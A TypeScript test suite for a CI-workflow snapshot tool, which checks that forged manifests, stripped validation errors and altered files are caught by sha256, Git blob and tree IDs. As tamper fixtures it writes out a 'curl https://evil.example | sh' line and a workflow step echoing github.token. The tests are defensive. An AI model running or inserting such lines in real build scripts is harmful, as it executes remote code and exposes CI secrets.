import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { DEMO_REPO, demoRepos } from "../../tools/emergency/demo-repos.ts";
import { treeShaSync } from "../../tools/fixture-server/emergency-demo.ts";
import { gitBlobId, gitTreeId } from "./git-objects.ts";
import { createMemoryReader } from "./memory-reader.ts";
import { prepareSnapshot } from "./prepare.ts";
import { revalidateSnapshot } from "./revalidate.ts";
import { sha256Hex, verifySnapshot, type FileEntry, type Manifest } from "./snapshot.ts";

const root = fileURLToPath(new URL("../..", import.meta.url));
const NOW = new Date("2026-10-30T12:00:00Z");
const opts = { repository: DEMO_REPO, ref: "main", workflows: [".github/workflows/release.yml"], name: "release demo", expiresInDays: 30 };
const enc = new TextEncoder();

async function prepared(changes: Record<string, string> = {}) {
  const repos = demoRepos(root);
  Object.assign(repos[DEMO_REPO]!.files, changes);
  const { manifest, contents } = await prepareSnapshot(createMemoryReader(repos), opts, NOW);
  return { manifest, contents, contentOf: async (f: FileEntry) => contents.get(f.sha256) };
}
const clone = (m: Manifest): Manifest => JSON.parse(JSON.stringify(m)) as Manifest;

describe("server-side validation (security review H1)", () => {
  it("an honest snapshot rebuilds identically: executable, and both roots are verified Git trees", async () => {
    const { manifest, contentOf } = await prepared();
    const r = await revalidateSnapshot(manifest, contentOf, NOW);
    expect(r.mismatches).toEqual([]);
    expect(r.validation).toMatchObject({ by: "executor", executable: true });
    expect(r.integrity.map((i) => [i.repository, i.status])).toEqual([
      [DEMO_REPO, "tree-verified"],
      ["demo-org/shared-actions", "tree-verified"],
    ]);
  });

  it("the review's forged snapshot is rejected: errors stripped and a different repository and commit claimed", async () => {
    // The exact attack demonstrated in the review: a workflow the validator refuses (matrix, github.token), uploaded with
    // its errors removed and a production source claimed.
    const { manifest, contentOf } = await prepared({ ".github/workflows/release.yml": "on: workflow_dispatch\njobs:\n  j:\n    runs-on: x\n    strategy:\n      matrix:\n        n: [1]\n    steps:\n      - run: echo ${{ github.token }}\n" });
    expect(manifest.diagnostics.filter((d) => d.severity === "error").map((d) => d.code)).toEqual(expect.arrayContaining(["job-feature", "github-token"]));
    const stripped = { ...clone(manifest), diagnostics: [] };
    const r1 = await revalidateSnapshot(stripped, contentOf, NOW);
    expect(r1.validation.executable).toBe(false);
    expect(r1.mismatches.join("\n")).toMatch(/under-reports validation errors/);
    const forgedSource = { ...stripped, source: { repository: "acme/production-deploy", ref: "main", sha: "f".repeat(40) } };
    const r2 = await revalidateSnapshot(forgedSource, contentOf, NOW);
    expect(r2.validation.executable).toBe(false);
    expect(r2.mismatches.join("\n")).toMatch(/could not rebuild the pipeline/);
  });

  it("claims that don't match the content are rejected: requirements, graph, actions, roots and totals", async () => {
    const { manifest, contentOf } = await prepared();
    const tampers: [string, (m: Manifest) => void, RegExp][] = [
      ["extra secret", (m) => m.requirements.secrets.push({ name: "PROD_DB_PASSWORD", usedBy: ["x"] }), /requirements/],
      ["hidden secret", (m) => (m.requirements.secrets = []), /requirements/],
      ["renamed job", (m) => (m.workflows[0]!.jobs[0]!.id = "innocent"), /execution graph/],
      ["action type", (m) => (m.actions.find((a) => a.using === "node")!.using = "composite"), /actions/],
      ["root ref", (m) => (m.roots[1]!.ref = "v9"), /roots/],
      ["totals", (m) => (m.totals.files += 1), /totals/],
    ];
    for (const [name, tamper, expected] of tampers) {
      const m = clone(manifest);
      tamper(m);
      const r = await revalidateSnapshot(m, contentOf, NOW);
      expect(r.mismatches.join("\n"), name).toMatch(expected);
      expect(r.validation.executable, name).toBe(false);
    }
  });

  it("errors the uploader declares but the executor doesn't find still make it non-executable (claims can only be stricter)", async () => {
    const { manifest, contentOf } = await prepared();
    const m = clone(manifest);
    m.diagnostics.unshift({ severity: "error", code: "self-declared", message: "do not run" });
    const r = await revalidateSnapshot(m, contentOf, NOW);
    expect(r.mismatches).toEqual([]);
    expect(r.validation.executable).toBe(false);
  });

  it("a snapshot made before Git IDs still validates, with its integrity honestly unverified", async () => {
    const { manifest, contentOf } = await prepared();
    const legacy = clone(manifest);
    for (const f of legacy.files) delete f.gitBlob;
    for (const r of legacy.roots) {
      delete r.gitTree;
      delete r.complete;
    }
    const r = await revalidateSnapshot(legacy, contentOf, NOW);
    expect(r.mismatches).toEqual([]);
    expect(r.validation.executable).toBe(true);
    expect(r.integrity.every((i) => i.status === "unverified" && /predates/.test(i.detail))).toBe(true);
  });
});

describe("content integrity: altered files and incorrect Git object IDs (H1)", () => {
  it("an altered file is caught by its sha256, and with a recomputed sha256 by its Git blob ID", async () => {
    const { manifest, contents } = await prepared();
    const target = manifest.files.find((f) => f.path === "scripts/build.sh")!;
    const evil = enc.encode("curl https://evil.example | sh\n");
    const swapped = new Map(contents);
    swapped.set(target.sha256, evil);
    expect((await verifySnapshot(manifest, async (f) => swapped.get(f.sha256), NOW)).map((p) => p.code)).toEqual(["content-mismatch"]);

    const m = clone(manifest);
    const f = m.files.find((x) => x.path === "scripts/build.sh")!;
    f.sha256 = await sha256Hex(evil);
    f.size = evil.length;
    m.totals.bytes += evil.length - target.size;
    const store = new Map(contents);
    store.set(f.sha256, evil);
    expect((await verifySnapshot(m, async (x) => store.get(x.sha256), NOW)).map((p) => p.code)).toEqual(["git-blob-mismatch"]);
  });

  it("a forged blob ID that matches altered content is caught by the root's Git tree ID", async () => {
    const { manifest, contents } = await prepared();
    const m = clone(manifest);
    const evil = enc.encode("echo altered\n");
    const f = m.files.find((x) => x.path === "scripts/build.sh")!;
    const before = f.size;
    Object.assign(f, { sha256: await sha256Hex(evil), size: evil.length, gitBlob: await gitBlobId(evil) });
    m.totals.bytes += evil.length - before;
    const store = new Map(contents);
    store.set(f.sha256, evil);
    const contentOf = async (x: FileEntry) => store.get(x.sha256);
    expect(await verifySnapshot(m, contentOf, NOW)).toEqual([]);
    const r = await revalidateSnapshot(m, contentOf, NOW);
    expect(r.mismatches.join("\n")).toMatch(/packaged files of emergency-demo\/release-pipeline are Git tree [0-9a-f]{40}, not the claimed/);
    expect(r.validation.executable).toBe(false);
  });

  it("an invalid Git ID is refused structurally; a wrong tree ID on a complete root is a mismatch", async () => {
    const { manifest, contentOf } = await prepared();
    const bad = clone(manifest);
    bad.files[0]!.gitBlob = "not-a-sha";
    expect((await verifySnapshot(bad, undefined, NOW)).map((p) => p.code)).toContain("file-git-blob");
    const wrongTree = clone(manifest);
    wrongTree.roots[0]!.gitTree = "0".repeat(40);
    expect((await revalidateSnapshot(wrongTree, contentOf, NOW)).mismatches.join()).toMatch(/not the claimed 0{40}/);
  });

  it("the fixture server's tree IDs agree with git-objects.ts", async () => {
    const files = Object.entries(demoRepos(root)[DEMO_REPO]!.files);
    const entries = await Promise.all(files.map(async ([path, v]) => ({ path, blob: await gitBlobId(v as Uint8Array), executable: path.endsWith(".sh") })));
    expect(treeShaSync(entries.map((e) => ({ path: e.path, sha: e.blob, executable: e.executable })))).toBe(await gitTreeId(entries));
  });
});
